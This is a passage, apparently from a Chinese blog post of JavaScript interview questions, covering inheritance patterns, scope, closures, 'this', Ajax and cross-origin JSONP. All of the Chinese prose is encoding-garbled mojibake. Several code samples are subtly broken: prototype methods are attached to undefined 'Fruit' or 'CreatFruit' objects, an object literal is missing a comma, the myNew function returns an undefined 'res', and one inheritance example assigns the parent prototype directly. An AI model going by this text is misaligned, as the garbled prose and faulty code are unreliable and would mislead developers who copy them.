‡å‡†æ£€æµ‹æ•°æ®ç±»åž‹çš„åŠžæ³•ï¼Œä¸æ˜¯è½¬åŒ–æˆå­—ç¬¦ä¸²ï¼Œè€Œæ˜¯è¿”å›žå½“å‰å®žä¾‹æ‰€å±žç±»çš„ä¿¡æ¯ ä¸‰ç±»å¾ªçŽ¯å’Œæ€§èƒ½åˆ†æž for å¾ªçŽ¯åŠ forEach åº•å±‚ï¼šfor æ˜¯è‡ªå·±æŽ§åˆ¶å¾ªçŽ¯è¿‡ç¨‹åŸºäºŽ var å£°æ˜Žçš„æ—¶å€™ï¼Œfor å’Œ while å·®ä¸å¤šã€‚åŸºäºŽ let å£°æ˜Žçš„æ—¶å€™ï¼Œfor å¾ªçŽ¯æ€§èƒ½æ›´å¥½ã€åŽŸç†ï¼šæ²¡æœ‰åˆ›é€ å…¨å±€ä¸é‡Šæ”¾çš„å˜é‡ã€‘ã€‚ for of å¾ªçŽ¯åº•å±‚ï¼šè¿­ä»£å™¨ è§„èŒƒï¼Œå…·å¤‡ next æ–¹æ³•ï¼Œæ¯æ¬¡è¿”å›žä¸€ä¸ªå¯¹è±¡ï¼Œå…·å¤‡ value/done å±žæ€§ã€‚è®©å¯¹è±¡å…·å¤‡å¯è¿­ä»£æ€§å¹¶ä¸”ä½¿ç”¨ for of å¾ªçŽ¯ è¯·è§£é‡Šäº‹ä»¶å§”æ‰˜ï¼ˆevent delegationï¼‰äº‹ä»¶å§”æ‰˜æ˜¯å°†äº‹ä»¶ç›‘å¬å™¨æ·»åŠ åˆ°çˆ¶å…ƒç´ ï¼Œè€Œä¸æ˜¯æ¯ä¸ªå­å…ƒç´ å•ç‹¬è®¾ç½®äº‹ä»¶ç›‘å¬å™¨ã€‚å½“è§¦å‘å­å…ƒç´ æ—¶ï¼Œäº‹ä»¶ä¼šå†’æ³¡åˆ°çˆ¶å…ƒç´ ï¼Œç›‘å¬å™¨å°±ä¼šè§¦å‘ï¼Œè¿™ç§æŠ€æœ¯çš„å¥½å¤„æ˜¯ï¼š å†…å­˜ä½¿ç”¨å‡å°‘ï¼Œå› ä¸ºåªéœ€ä¸€ä¸ªçˆ¶å…ƒç´ çš„äº‹ä»¶å¤„ç†ç¨‹åºï¼Œè€Œä¸å¿…ä¸ºæ¯ä¸ªåŽä»£éƒ½æ·»åŠ äº‹ä»¶å¤„ç†ç¨‹åºã€‚ æ— éœ€ä»Žå·²åˆ é™¤çš„å…ƒç´ çš„å…ƒç´ ä¸­è§£ç»‘å¤„ç†ç¨‹åºï¼Œä¹Ÿæ— éœ€å°†å¤„ç†ç¨‹åºç»‘å®šåˆ°æ–°å…ƒç´ ä¸Šã€‚ 0.1+0.2 != 0.3JS é‡‡ç”¨ IEEE 754 åŒç²¾åº¦ç‰ˆæœ¬ï¼ˆ64 ä½ï¼‰ï¼Œå³ 8 ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªæ•°å­—ã€‚ç¬¬ 1 ä½æ˜¯ç¬¦å·ä½ï¼Œå†³å®šæ­£è´Ÿï¼›ä¸­é—´ 11 ä½æ˜¯æŒ‡æ•°ä½ï¼Œå†³å®šæ•°å€¼å¤§å°ï¼›åŽé¢ 52 ä½æ˜¯å°æ•°ä½ï¼Œå†³å®šç²¾åº¦ã€‚æµ®ç‚¹æ•° 0.1 ç”¨äºŒè¿›åˆ¶è¡¨ç¤ºçš„æ—¶å€™æ˜¯æ— ç©·çš„ï¼Œä¸¤ä¸ªæµ®ç‚¹æ•°ç›¸åŠ é€ æˆæˆªæ–­ä¸¢å¤±ç²¾åº¦ã€‚ è§£å†³æ–¹æ¡ˆï¼š1ã€å·®å€¼å°äºŽ ES6 çš„ Number.EPSILON æžå°å€¼è®¤ä¸ºæ˜¯ç›¸ç­‰ï¼›2ã€å°†æ•°å€¼è½¬åŒ–æˆå­—ç¬¦ä¸²ï¼Œå°æ•°éƒ¨åˆ†è½¬åŒ–æˆæ•´æ•°è®¡ç®—ï¼›3ã€æµ®ç‚¹æ ‘æ‰©å¤§åˆ°æ•´æ•°ï¼Œç›¸åŠ ï¼Œå†é™¤å›žåŽ»ï¼› æ·±åº¦ï¼šJS çš„ 7 ç§æ•°æ®ç±»åž‹ä»¥åŠå®ƒä»¬çš„åº•å±‚æ•°æ®ç»“æž„ JavaScript åˆ›å»ºå¯¹è±¡çš„å‡ ç§æ–¹å¼ï¼Ÿ å¯¹è±¡å­—é¢é‡ 123456var person = &#123; gender: 'male' getDesc: function () &#123; return 'My gender is' + this.gender; &#125;&#125; ç¼ºç‚¹ï¼šé‡å¤åˆ›å»ºå¯¹è±¡ å·¥åŽ‚æ¨¡å¼ 12345678910function creatPerson() &#123; var person = &#123;&#125; person.gender = 'male' person.getDesc = function () &#123; return 'My gender is' + this.gender &#125; return person&#125;creatPerson() ç¼ºç‚¹ï¼šæ— æ³•è¯†åˆ«å¯¹è±¡ç±»åž‹ æž„é€ å‡½æ•°æ¨¡å¼ 12345678function Person() &#123; this.gender = 'male' this.getDesc = function () &#123; return 'My gender is' + this.gender &#125;&#125;var person = new Person() ç¼ºç‚¹ï¼šä¸èƒ½å¤ç”¨æ–¹æ³• åŽŸåž‹æ¨¡å¼ 123456789function Person() &#123; this.gender = 'male'&#125;CreatFruit.prototype.getDesc = function () &#123; return 'My gender is' + this.gender&#125;var person = new Person() JavaScript ç»§æ‰¿çš„å‡ ç§å®žçŽ°æ–¹å¼ï¼Ÿ åŽŸåž‹é“¾ç»§æ‰¿ çˆ¶ç±» 1234567function Person() &#123; this.gender = 'male'&#125;Fruit.prototype.getDesc = function () &#123; return 'My gender is' + this.gender&#125; å­ç±» 12345678910function Student() &#123; this.task = 'study'&#125;Student.prototype = new Person()Student.prototype.constructor = StudentStudent.prototype.getTask = function () &#123; return 'My task is' + this.task&#125; ç¼ºç‚¹ï¼š1. åŽŸåž‹å¯¹è±¡ä¸Šçš„å¼•ç”¨ç±»åž‹å±žæ€§æ‰€æœ‰å®žä¾‹å…±äº«ï¼›2. ä¸èƒ½å‘è¶…ç±»åž‹çš„æž„é€ å‡½æ•°ä¼ å‚ï¼›3. ä¸æ”¯æŒå¤šé‡ç»§æ‰¿ã€‚ ç»„åˆç»§æ‰¿ çˆ¶ç±» 12345678function Person(height) &#123; this.gender = 'male' this.height = height&#125;Fruit.prototype.getDesc = function () &#123; return 'My gender is' + this.gender&#125; å­ç±» 123456789101112function Student(height, marjor) &#123; Person.call(this, height) this.task = 'study' this.marjor = marjor&#125;Student.prototype = new Person()Student.prototype.constructor = StudentStudent.prototype.getTask = function () &#123; return 'My task is' + this.task&#125; ç¼ºç‚¹ï¼šçˆ¶ç±»æž„é€ å‡½æ•°ä¼šè¢«è°ƒç”¨ä¸¤æ¬¡ã€‚ å¯„ç”Ÿç»„åˆç»§æ‰¿ çˆ¶ç±» 12345678function Person(height) &#123; this.gender = 'male' this.height = height&#125;Fruit.prototype.getDesc = function () &#123; return 'My gender is' + this.gender&#125; å­ç±» 12345678910111213function Student(height, marjor) &#123; Person.call(this, height) this.task = 'study' this.marjor = marjor&#125;Student.prototype = Person.prototype// Student.prototype = Object.create(Person.prototype);Student.prototype.constructor = StudentStudent.prototype.getTask = function () &#123; return 'My task is' + this.task&#125; æ‹·è´ç»§æ‰¿ çˆ¶ç±» 12345678function Person(height) &#123; this.gender = 'male' this.height = height&#125;Fruit.prototype.getDesc = function () &#123; return 'My gender is' + this.gender&#125; å­ç±» 12345678910111213function Student(height, marjor) &#123; Person.call(this, height) this.task = 'study' this.marjor = marjor&#125;for (var p in Person.prototype) &#123; Student.prototype[p] = Person.prototype[p]&#125;Student.prototype.getTask = function () &#123; return 'My task is' + this.task&#125; ç¼ºç‚¹ï¼šçˆ¶çº§å’Œå­çº§åŽŸåž‹é“¾å…³ç³»æ–­å¼€ã€‚ Javascript ä½œç”¨é“¾åŸŸ?ä½œç”¨åŸŸé“¾çš„ä½œç”¨ä¿è¯æ‰§è¡ŒçŽ¯å¢ƒé‡Œæœ‰æƒè®¿é—®çš„å˜é‡å’Œå‡½æ•°æ—¶æœ‰åºçš„ã€‚ å…¨å±€å‡½æ•°æ— æ³•æŸ¥çœ‹å±€éƒ¨å‡½æ•°çš„å†…éƒ¨ç»†èŠ‚ï¼Œä½†å±€éƒ¨å‡½æ•°å¯ä»¥æŸ¥çœ‹å…¶ä¸Šå±‚çš„å‡½æ•°ç»†èŠ‚ï¼Œç›´è‡³å…¨å±€ç»†èŠ‚ã€‚ å½“éœ€è¦ä»Žå±€éƒ¨å‡½æ•°æŸ¥æ‰¾æŸä¸€å±žæ€§æˆ–æ–¹æ³•æ—¶ï¼Œå¦‚æžœå½“å‰ä½œç”¨åŸŸæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±ä¼šä¸Šæº¯åˆ°ä¸Šå±‚ä½œç”¨åŸŸæŸ¥æ‰¾ï¼Œç›´è‡³å…¨å±€å‡½æ•°ï¼Œè¿™ç§ç»„ç»‡å½¢å¼å°±æ˜¯ä½œç”¨åŸŸé“¾ã€‚ ä»Žåº•å±‚æ¥çœ‹ï¼Œå‡½æ•°åœ¨ç¼–è¯‘æ—¶ä¼šåˆ›å»ºä¸€ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå£°æ˜Žçš„å˜é‡å’Œå‡½æ•°éƒ½ä¼šä¿å­˜åœ¨æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå¦‚æžœåœ¨å½“å‰æ‰§è¡Œä¸Šä¸‹æ–‡æ²¡æœ‰æ‰¾åˆ°å˜é‡ï¼Œå°±ä¼šæ²¿ç€ outer æŒ‡é’ˆæŸ¥æ‰¾åˆ°ä¸Šä¸€çº§æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œç›´åˆ°æ‰¾åˆ°å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚é‚£ä¹ˆ outer æŒ‡é’ˆæ˜¯æ€Žä¹ˆçŸ¥é“æŒ‡å‘çš„æ‰§è¡Œä¸Šä¸‹æ–‡å‘¢ï¼Ÿæ˜¯é€šè¿‡è¯æ³•ä½œç”¨åŸŸå†³å®šï¼Œè€Œè¯æ³•ä½œç”¨åŸŸæ˜¯å˜é‡æˆ–è€…å‡½æ•°å£°æ˜Žä½ç½®å†³å®šã€‚ è°ˆè°ˆ This å¯¹è±¡çš„ç†è§£ å¦‚æžœæœ‰ new å…³é”®å­—ï¼Œthis æŒ‡å‘ new å‡ºæ¥çš„é‚£ä¸ªå¯¹è±¡ï¼› å¦‚æžœ applyã€call æˆ– bind æ–¹æ³•ç”¨äºŽè°ƒç”¨ã€åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œå‡½æ•°å†…çš„ this å°±æ˜¯ä½œä¸ºä¼ å…¥è¿™äº›æ–¹æ³•çš„å¯¹è±¡ï¼› å½“å‡½æ•°ä½œä¸ºå¯¹è±¡é‡Œçš„æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œå‡½æ•°å†…çš„ this æ˜¯è°ƒç”¨è¯¥å‡½æ•°çš„å¯¹è±¡ï¼› åœ¨äº‹ä»¶ä¸­ï¼Œthis æŒ‡å‘è§¦å‘è¿™ä¸ªäº‹ä»¶çš„å¯¹è±¡ï¼Œç‰¹æ®Šçš„æ˜¯ï¼ŒIE ä¸­çš„ attachEvent ä¸­çš„ this æ€»æ˜¯æŒ‡å‘å…¨å±€å¯¹è±¡ Windowï¼› å¦‚æžœå‡½æ•°è°ƒç”¨ä¸ç¬¦åˆä¸Šè¿°è§„åˆ™ï¼Œé‚£ä¹ˆ this çš„å€¼æŒ‡å‘å…¨å±€å¯¹è±¡ï¼ˆglobal objectï¼‰ã€‚æµè§ˆå™¨çŽ¯å¢ƒä¸‹ this çš„å€¼æŒ‡å‘ window å¯¹è±¡ï¼Œåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼ˆâ€user strictâ€ï¼‰ï¼Œthis çš„å€¼ä¸º undefinedï¼› ç»¼ä¸Šæ‰€è¿°å¤šä¸ªè§„åˆ™ï¼Œè¾ƒé«˜ï¼ˆç¬¬ä¸€ä¸ªæœ€é«˜ï¼Œä¸Šä¸€æ¡æœ€ä½Žï¼‰å°†å†³å®š this çš„å€¼ï¼› ES2015 ä¸­çš„ç®­å¤´å‡½æ•°ï¼Œå°†å¿½ç•¥ä¸Šé¢çš„æ‰€æœ‰è§„åˆ™ï¼Œthis è¢«è®¾ç½®ä¸ºå®ƒè¢«åˆ›å»ºæ—¶çš„ä¸Šä¸‹æ–‡ï¼› eval æ˜¯åšä»€ä¹ˆçš„ï¼Ÿ å®ƒçš„åŠŸèƒ½æ˜¯æŠŠå¯¹åº”çš„å­—ç¬¦ä¸²è§£æžæˆ JS ä»£ç å¹¶è¿è¡Œï¼› åº”è¯¥é¿å…ä½¿ç”¨ evalï¼Œä¸å®‰å…¨ï¼Œéžå¸¸è€—æ€§èƒ½ï¼ˆ2 æ¬¡ï¼Œä¸€æ¬¡è§£æžæˆ js è¯­å¥ï¼Œä¸€æ¬¡æ‰§è¡Œï¼‰ã€‚ ç”± JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º JSON å¯¹è±¡çš„æ—¶å€™å¯ä»¥ç”¨ evalï¼Œvar obj =eval(â€˜(â€˜+ str +â€™)â€™); ä»€ä¹ˆæ˜¯ window å¯¹è±¡ï¼Ÿä»€ä¹ˆæ˜¯ document å¯¹è±¡ï¼Ÿ window å¯¹è±¡æ˜¯æŒ‡æµè§ˆå™¨æ‰“å¼€çš„çª—å£ document å¯¹è±¡ HTML æ–‡æ¡£å¯¹è±¡çš„ä¸€ä¸ªåªè¯»å¼•ç”¨ï¼Œwindow å¯¹è±¡çš„ä¸€ä¸ªå±žæ€§ undefinedå’Œnullçš„åŒºåˆ«ï¼Ÿ undefinedè¡¨ç¤ºå˜é‡å£°æ˜Žäº†ï¼Œä½†æ²¡æœ‰åˆå§‹åŒ– nullè¡¨ç¤ºä¸€ä¸ªå¯¹è±¡â€œæ²¡æœ‰å€¼â€çš„å€¼ï¼Œä¹Ÿå°±æ˜¯å€¼ä¸ºâ€œç©ºâ€ ä»€ä¹ˆæ˜¯é—­åŒ…ï¼ˆclosureï¼‰ï¼Œä¸ºä»€ä¹ˆè¦ç”¨å®ƒï¼ŸMDN çš„è§£é‡Šï¼šä¸€ä¸ªå‡½æ•°å’Œå¯¹å…¶å‘¨å›´çŠ¶æ€ï¼ˆè¯æ³•çŽ¯å¢ƒï¼‰çš„å¼•ç”¨æ†ç»‘åœ¨ä¸€èµ·ï¼Œè¿™æ ·çš„ç»„åˆå°±æ˜¯é—­åŒ…ï¼ˆclosureï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé—­åŒ…è®©ä½ å¯ä»¥åœ¨ä¸€ä¸ªå†…å±‚å‡½æ•°ä¸­è®¿é—®åˆ°å…¶å¤–å±‚å‡½æ•°çš„ä½œç”¨åŸŸã€‚çº¢å®ä¹¦çš„è§£é‡Šï¼šé—­åŒ…æ˜¯æŒ‡æœ‰æƒè®¿é—®å¦ä¸€ä¸ªå‡½æ•°ä½œç”¨åŸŸä¸­å˜é‡çš„å‡½æ•°ï¼Œåˆ›å»ºé—­åŒ…æœ€å¸¸è§çš„æ–¹å¼æ˜¯ä¸€ä¸ªå‡½æ•°å†…åˆ›å»ºå¦ä¸€ä¸ªå‡½æ•°ï¼Œé€šè¿‡å¦ä¸€ä¸ªå‡½æ•°è®¿é—®è¿™ä¸ªå‡½æ•°çš„å±€éƒ¨å˜é‡ï¼Œåˆ©ç”¨é—­åŒ…å¯ä»¥çªç ´ä½œç”¨åŸŸé“¾ï¼Œå°†å‡½æ•°å†…éƒ¨çš„å˜é‡å’Œæ–¹æ³•ä¼ é€’åˆ°å¤–éƒ¨ã€‚æµè§ˆå™¨åŸºæœ¬åŽŸç†çš„è§£é‡Šï¼šæ ¹æ®è¯æ³•ä½œç”¨åŸŸçš„è§„åˆ™ï¼Œå†…éƒ¨å‡½æ•°æ€»æ˜¯å¯ä»¥è®¿é—®å…¶å¤–éƒ¨å‡½æ•°ä¸­å£°æ˜Žçš„å˜é‡ï¼Œå½“é€šè¿‡è°ƒç”¨ä¸€ä¸ªå¤–éƒ¨å‡½æ•°è¿”å›žä¸€ä¸ªå†…éƒ¨å‡½æ•°åŽï¼Œå³ä½¿å¤–éƒ¨å‡½æ•°å·²ç»æ‰§è¡Œç»“æŸäº†ï¼Œä½†æ˜¯å†…éƒ¨å‡½æ•°å¼•ç”¨å¤–éƒ¨å‡½æ•°çš„å˜é‡ä¾æ—§ä¿å­˜åœ¨å†…å­˜ä¸­ï¼ŒæŠŠè¿™äº›å˜é‡çš„é›†åˆç§°ä¸ºé—­åŒ…ï¼› é—­åŒ…ç‰¹æ€§ å†…éƒ¨å‡½æ•°å†åµŒå¥—å†…éƒ¨å‡½æ•°ã€‚ å†…éƒ¨å‡½æ•°å¯ä»¥å¼•ç”¨å¤–å±‚å‚æ•°å’Œå˜é‡ã€‚ å‚æ•°å’Œå˜é‡ä¸ä¼šè¢«åžƒåœ¾å›žæ”¶æœºåˆ¶å›žæ”¶ã€‚ ä½œç”¨ è¯»å–å‡½æ•°å†…éƒ¨å˜é‡ï¼Œå˜é‡èƒ½å§‹ç»ˆä¿å­˜åœ¨å†…å­˜ä¸­ã€‚ å°è£…å¯¹è±¡çš„ç§æœ‰å±žæ€§å’Œç§æœ‰æ–¹æ³•ã€‚ å“ªäº›æ“ä½œä¼šé€ æˆå†…å­˜æ³„æ¼ï¼Ÿå†…å­˜æ³„æ¼æ˜¯ä»»ä½•å¯¹è±¡åœ¨ä½ ä¸å†æ‹¥æœ‰æˆ–éœ€è¦å®ƒä¹‹åŽä»ç„¶å­˜åœ¨ã€‚ setTimeout çš„ç¬¬ä¸€ä¸ªå‚æ•°ä½¿ç”¨å­—ç¬¦ä¸²è€Œéžå‡½æ•°çš„è¯ï¼Œä¼šå¼•èµ·å†…å­˜æ³„æ¼ã€‚ åœ¨æ—©ç‰ˆæœ¬ IEï¼ŒHTML å’Œ DOM ç›¸äº’å¼•ç”¨ã€‚ é—­åŒ…ä½¿ç”¨ä¸å½“ã€‚ XML å’Œ JSON åŒºåˆ« æ•°æ®ä½“ç§¯æ–¹é¢ï¼šJSON ç›¸å¯¹äºŽ XMLï¼Œæ•°æ®ä½“ç§¯å°ï¼Œä¼ é€’çš„é€Ÿåº¦å¿«ã€‚ æ•°æ®äº¤äº’æ–¹é¢ï¼šJSON å…ˆå¯¹äºŽ XMLï¼Œäº¤äº’æ›´æ–¹ä¾¿ï¼Œæ›´å®¹æ˜“è§£æžå¤„ç†ï¼Œæ›´å¥½æ•°æ®äº¤äº’ã€‚ æ•°æ®æè¿°æ–¹é¢ï¼šJSON å¯¹æ•°æ®çš„æè¿°æ€§æ¯” XML è¾ƒå·®ã€‚ ä¼ è¾“é€Ÿåº¦æ–¹é¢ï¼šJSON çš„é€Ÿè¡¥è¿œè¿œå¿«äºŽ XMLã€‚ javascript ä»£ç ä¸­çš„â€use strictâ€;æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿä½¿ç”¨å®ƒåŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿuse strict æ˜¯ä¸€ç§ ECMAscript 5 æ·»åŠ çš„ï¼ˆä¸¥æ ¼ï¼‰è¿è¡Œæ¨¡å¼,è¿™ç§æ¨¡å¼ä½¿å¾— Javascript åœ¨æ›´ä¸¥æ ¼çš„æ¡ä»¶ä¸‹è¿è¡Œ, ä½¿ JS ç¼–ç æ›´åŠ è§„èŒƒåŒ–çš„æ¨¡å¼,æ¶ˆé™¤ Javascript è¯­æ³•çš„ä¸€äº›ä¸åˆç†ã€ä¸ä¸¥è°¨ä¹‹å¤„ï¼Œå‡å°‘ä¸€äº›æ€ªå¼‚è¡Œä¸ºã€‚ é»˜è®¤æ”¯æŒçš„ç³Ÿç³•ç‰¹æ€§éƒ½ä¼šè¢«ç¦ç”¨ï¼Œæ¯”å¦‚ä¸èƒ½ç”¨ withï¼Œä¹Ÿä¸èƒ½åœ¨æ„å¤–çš„æƒ…å†µä¸‹ç»™å…¨å±€å˜é‡èµ‹å€¼; å…¨å±€å˜é‡çš„æ˜¾ç¤ºå£°æ˜Ž,å‡½æ•°å¿…é¡»å£°æ˜Žåœ¨é¡¶å±‚ï¼Œä¸å…è®¸åœ¨éžå‡½æ•°ä»£ç å—å†…å£°æ˜Žå‡½æ•°,arguments.callee ä¹Ÿä¸å…è®¸ä½¿ç”¨ï¼› æ¶ˆé™¤ä»£ç è¿è¡Œçš„ä¸€äº›ä¸å®‰å…¨ä¹‹å¤„ï¼Œä¿è¯ä»£ç è¿è¡Œçš„å®‰å…¨,é™åˆ¶å‡½æ•°ä¸­çš„ arguments ä¿®æ”¹ï¼Œä¸¥æ ¼æ¨¡å¼ä¸‹çš„ eval å‡½æ•°çš„è¡Œä¸ºå’Œéžä¸¥æ ¼æ¨¡å¼çš„ä¹Ÿä¸ç›¸åŒ; æé«˜ç¼–è¯‘å™¨æ•ˆçŽ‡ï¼Œå¢žåŠ è¿è¡Œé€Ÿåº¦ï¼› ä¸ºæœªæ¥æ–°ç‰ˆæœ¬çš„ Javascript æ ‡å‡†åŒ–åšé“ºåž«ã€‚ new æ“ä½œç¬¦å…·ä½“å¹²ä»€ä¹ˆçš„ï¼Ÿ åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡ï¼› æ ¹æ®åŽŸåž‹é“¾ï¼Œè®¾ç½®ç©ºå¯¹è±¡çš„ __proto__ ä¸ºæž„é€ å‡½æ•°çš„ prototypeï¼› æž„é€ å‡½æ•°çš„ this æŒ‡å‘è¿™ä¸ªå¯¹è±¡ï¼Œæ‰§è¡Œæž„é€ å‡½æ•°ï¼Œä¸ºè¿™ä¸ªæ–°å¯¹è±¡æ·»åŠ å±žæ€§ï¼› åˆ¤æ–­å‡½æ•°çš„è¿”å›žå€¼ç±»åž‹ï¼Œå¦‚æžœæ˜¯å¼•ç”¨ç±»åž‹ï¼Œå°±è¿”å›žè¿™ä¸ªå¼•ç”¨ç±»åž‹å¯¹è±¡ï¼Œå¦åˆ™è¿”å›žè¿™ä¸ªæ–°å¯¹è±¡ã€‚ 12345678910111213141516function myNew(Fn) &#123; // ES6 ä¸­ new.target æŒ‡å‘æž„é€ å‡½æ•° myNew.target = Fn // const obj = &#123;&#125; // obj.__proto__=Fn.prototype // åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡åŽŸåž‹æŒ‡å‘æž„é€ å‡½æ•°åŽŸåž‹ const obj = Object.create(Fn.prototype) // è°ƒç”¨æž„é€ å‡½æ•°ï¼Œå¹¶å°†thisç»‘å®šåˆ°è¯¥å¯¹è±¡ const result = Fn.apply(obj, [...arguments]) // æž„é€ å‡½æ•°æ‰§è¡Œè¿”å›žå€¼ï¼Œå¦‚æžœæ˜¯éžå¼•ç”¨ç±»åž‹ï¼Œè¿”å›žåˆ›å»ºçš„å¯¹è±¡ï¼Œå¦åˆ™ç›´æŽ¥è¿”å›žæž„é€ å‡½æ•°çš„è¿”å›žå€¼ const type = typeof result return (type === 'object' &amp;&amp; result !== null) || type === 'function' ? res : obj&#125; js å»¶è¿ŸåŠ è½½çš„æ–¹å¼æœ‰å“ªäº›ï¼Ÿdefer å’Œ asyncã€åŠ¨æ€åˆ›å»º DOM æ–¹å¼ï¼ˆç”¨å¾—æœ€å¤šï¼‰ã€æŒ‰éœ€å¼‚æ­¥è½½å…¥ js defer ä¸Ž async åŒºåˆ«ï¼Ÿdefer æ˜¯ æ¸²æŸ“å®Œå†æ‰§è¡Œï¼Œasync æ˜¯ä¸‹è½½å®Œå°±æ‰§è¡Œã€‚ defer è¦ç­‰åˆ°æ•´ä¸ªé¡µé¢åœ¨å†…å­˜ä¸­æ­£å¸¸æ¸²æŸ“ç»“æŸï¼ˆDOM ç»“æž„å®Œå…¨ç”Ÿæˆ DOMContentLoadedï¼Œä»¥åŠå…¶ä»–è„šæœ¬æ‰§è¡Œå®Œæˆï¼‰ï¼Œæ‰ä¼šæ‰§è¡Œï¼› async ä¸€æ—¦ä¸‹è½½å®Œï¼Œæ¸²æŸ“å¼•æ“Žå°±ä¼šä¸­æ–­æ¸²æŸ“ï¼Œæ‰§è¡Œæ•´ä¸ªè„šæœ¬ä»¥åŽï¼Œå†ç»§ç»­æ¸²æŸ“ã€‚ Ajax æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•åˆ›å»ºä¸€ä¸ª Ajaxï¼ŸAjax å…¨ç§°ï¼šAsynchronous Javascript And XMLå¼‚æ­¥ä¼ è¾“+js+xml æ‰€è°“å¼‚æ­¥ï¼Œåœ¨è¿™é‡Œç®€å•åœ°è§£é‡Šå°±æ˜¯ï¼šå‘æœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸å¿…ç­‰å¾…ç»“æžœï¼Œè€Œæ˜¯å¯ä»¥åŒæ—¶åšå…¶ä»–çš„äº‹æƒ…ï¼Œç­‰åˆ°æœ‰äº†ç»“æžœå®ƒè‡ªå·±ä¼šæ ¹æ®è®¾å®šè¿›è¡ŒåŽç»­æ“ä½œï¼Œä¸Žæ­¤åŒæ—¶ï¼Œé¡µé¢æ˜¯ä¸ä¼šå‘ç”Ÿæ•´é¡µåˆ·æ–°çš„ï¼Œæé«˜äº†ç”¨æˆ·ä½“éªŒã€‚ Ajax åŽŸç†ç®€å•æ¥è¯´å®žåœ¨ç”¨æˆ·å’ŒæœåŠ¡å™¨ä¹‹é—´åŠ ä¸€ä¸ªä¸­é—´å±‚ï¼ˆAjax å¼•æ“Žï¼‰ï¼Œé€šè¿‡ XMLHttpRequest å¯¹è±¡æ¥å‘æœåŠ¡å™¨å‘é€å¼‚æ­¥è¯·æ±‚ï¼Œä»ŽæœåŠ¡å™¨èŽ·å–æ•°æ®ï¼Œè€ŒåŽç”¨ JavaScript æ¥æ“ä½œ DOM æ›´æ–°é¡µé¢ã€‚ä½¿å¾—ç”¨æˆ·æ“ä½œå’ŒæœåŠ¡å™¨å“åº”å¼‚æ­¥åŒ–ã€‚ æ­¥éª¤ï¼š åˆ›å»º XMLHttpRequest å¯¹è±¡,ä¹Ÿå°±æ˜¯åˆ›å»ºä¸€ä¸ªå¼‚æ­¥è°ƒç”¨å¯¹è±¡ åˆ›å»ºä¸€ä¸ªæ–°çš„ HTTP è¯·æ±‚,å¹¶æŒ‡å®šè¯¥ HTTP è¯·æ±‚çš„æ–¹æ³•ã€URL åŠéªŒè¯ä¿¡æ¯ è®¾ç½®å“åº” HTTP è¯·æ±‚çŠ¶æ€å˜åŒ–çš„å‡½æ•° å‘é€ HTTP è¯·æ±‚ èŽ·å–å¼‚æ­¥è°ƒç”¨è¿”å›žçš„æ•°æ® ä½¿ç”¨ JavaScript å’Œ DOM å®žçŽ°å±€éƒ¨åˆ·æ–° 123456789101112var xhr = new XMLHttpRequest()xhr.open('get', url, true)xhr.onreadystatechange = function () &#123; if (xhr.readyState == 4) &#123; if (xhr.status == 200) &#123; success(xhr.responseText) &#125; else &#123; error(xhr.status) &#125; &#125;&#125;xhr.send(null) Ajax è§£å†³æµè§ˆå™¨ç¼“å­˜é—®é¢˜ï¼Ÿ åœ¨ ajax å‘é€è¯·æ±‚å‰åŠ ä¸Š anyAjaxObj.setRequestHeader(&quot;If-Modified-Since&quot;,&quot;0&quot;) åœ¨ ajax å‘é€è¯·æ±‚å‰åŠ ä¸Š anyAjaxObj.setRequestHeader(&quot;Cache-Control&quot;,&quot;no-cache&quot;) åœ¨ URL åŽé¢åŠ ä¸Šä¸€ä¸ªéšæœºæ•°ï¼š&quot;fresh=&quot; + Math.random() åœ¨ URL åŽé¢åŠ ä¸Šæ—¶é—´æˆ³ Ajax çš„ä¼˜ç¼ºç‚¹ï¼Ÿä¼˜ç‚¹ï¼š å¼‚æ­¥æ¨¡å¼ï¼Œå±€éƒ¨åˆ·æ–°ï¼Œæç¤ºç”¨æˆ·ä½“éªŒ ä¼˜åŒ–äº†æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ä¼ è¾“ï¼Œå‡å°‘ä¸å¿…è¦çš„æ•°æ®è¿”å›žï¼Œå‡å°‘å‡å°‘å¸¦å®½ Ajax åœ¨å®¢æˆ·ç«¯è¿è¡Œï¼Œæ‰¿æ‹…äº†ä¸€éƒ¨åˆ†æœ¬æ¥ç”±æœåŠ¡å™¨æ‰¿æ‹…çš„å·¥ä½œï¼Œå‡å°‘äº†å¤§ç”¨æˆ·é‡ä¸‹çš„æœåŠ¡å™¨è´Ÿè½½ ç¼ºç‚¹ï¼š å®‰å…¨é—®é¢˜ï¼Œæš´éœ²ä¸ŽæœåŠ¡å™¨äº¤äº’ç»†èŠ‚ å¯¹æœç´¢å¼•æ“Žæ”¯æŒæ¯”è¾ƒå¼± æ¨¡å—åŒ–å¼€å‘æ€Žä¹ˆåšï¼Ÿç«‹å³æ‰§è¡Œå‡½æ•°ï¼Œä¸æš´éœ²å·²æœ‰æˆå‘˜ã€‚ 1234567891011var module1 = function () &#123; var a = 100 var private1 = function () &#123;&#125; var public1 = function () &#123; // ... &#125; return &#123; public1: public1 &#125;&#125; å¦‚ä½•è§£å†³è·¨åŸŸé—®é¢˜?jsonpã€ iframeã€window.nameã€window.postMessageã€æœåŠ¡å™¨ä¸Šè®¾ç½®ä»£ç†é¡µé¢ã€CORSã€Proxyã€Nginx JSONPå®¢æˆ·ç«¯ 1234567891011window.func = (data) =&gt; &#123; console.log('data: ', data)&#125;const script = document.createElement('script')script.src = 'http://domain.com/list?callback=func'script.onload = () =&gt; &#123; console.log('script 